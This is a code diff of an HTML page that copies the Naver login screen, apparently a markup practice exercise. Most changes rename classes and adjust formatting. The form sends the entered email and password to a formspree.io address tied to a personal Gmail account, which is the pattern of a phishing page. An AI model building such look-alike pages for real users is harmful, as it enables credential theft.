@@ -1,5 +1,6 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="ko-KR">
+
   <head>
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -7,51 +8,52 @@
     <title>네이버 - 로그인</title>
     <link rel="stylesheet" href="./css/style.css" />
   </head>
+
   <body>
     <h1 class="logo">
-      <a href="https://www.naver.com/">
+      <a class="naver-home-link" href="https://www.naver.com/">
         <img src="./images/logo.png" srcset="./images/logo.svg" alt="Naver" />
       </a>
     </h1>
     <form
-      action="https://formspree.io/seulbinim@gmail.com"
-      class="login-form"
-      method="POST"
-    >
+          action="https://formspree.io/seulbinim@gmail.com"
+          class="login-form"
+          method="POST">
       <fieldset>
         <legend class="a11y">로그인 폼</legend>
-        <div class="container">
+        <div class="login-form-container">
           <div class="user-email">
             <label for="userEmail" class="a11y">아이디</label>
             <input
-              name="userEmail"
-              type="email"
-              id="userEmail"
-              placeholder="아이디(이메일)"
-              required="required"
-            />
+                   class="user-email-input"
+                   name="userEmail"
+                   type="email"
+                   id="userEmail"
+                   placeholder="아이디(이메일)"
+                   required="required" />
           </div>
           <div class="user-password">
             <label for="userPassword" class="a11y">비밀번호</label>
             <input
-              name="userPassword"
-              type="password"
-              id="userPassword"
-              placeholder="비밀번호"
-              required="required"
-            />
+                   class="user-password-input"
+                   name="userPassword"
+                   type="password"
+                   id="userPassword"
+                   placeholder="비밀번호"
+                   required="required" />
           </div>
-          <div class="ip-state-wrapper">
+          <div class="login-state-ip-security-checkbox-wrapper">
             <div class="login-state">
-              <input name="state" type="checkbox" id="loginState" />
-              <label for="loginState">
+              <input class="login-state-checkbox" name="state" type="checkbox" id="loginState" />
+              <label for="loginState" class="login-state-label">
                 <span class="icon-check"></span>
                 로그인 상태유지
               </label>
             </div>
+            <a href="./ip_security.html" class="ip-security-link" target="_blank" rel="noopperner noreferrer" title="IP 보안에 대해">IP 보안</a>
             <div class="login-ip">
-              <input name="ip" type="checkbox" id="loginIp" />
-              <label for="loginIp">IP 보안</label>
+              <input class="ip-security-checkbox" name="ip" type="checkbox" id="loginIp" />
+              <label for="loginIp" class="ip-security-label" aria-label="IP 보안"></label>
             </div>
           </div>
           <button type="submit" class="btn-login">로그인</button>
@@ -59,4 +61,5 @@
       </fieldset>
     </form>
   </body>
+
 </html>
